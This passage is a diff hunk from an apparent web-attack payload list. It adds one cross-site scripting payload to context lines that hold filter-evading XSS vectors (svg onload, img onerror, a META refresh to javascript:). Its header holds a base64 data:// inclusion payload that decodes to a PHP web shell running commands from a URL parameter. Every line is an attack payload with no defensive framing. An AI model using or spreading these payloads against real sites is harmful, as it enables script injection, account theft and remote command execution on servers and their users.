@@ -23,6 +23,7 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9
 /(A(%22onerror='confirm%601%60'testabcd))/
 <svg<script> onmou<script>seover</script>="confirm('xss')">hii</svg</script>>
 "/><img src=xss onerror=confirm(1)><IMG SRC=/ onerror="confirm(String.fromCharCode(88,83,83))"></img>
+`/alert?.(1)'"><Svg/OnLoad='`
 PL"><svg/onload=confirm()><"
 http://aaa#'><img onerror=confirm(location) src=.>
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:confirm('XSS');">
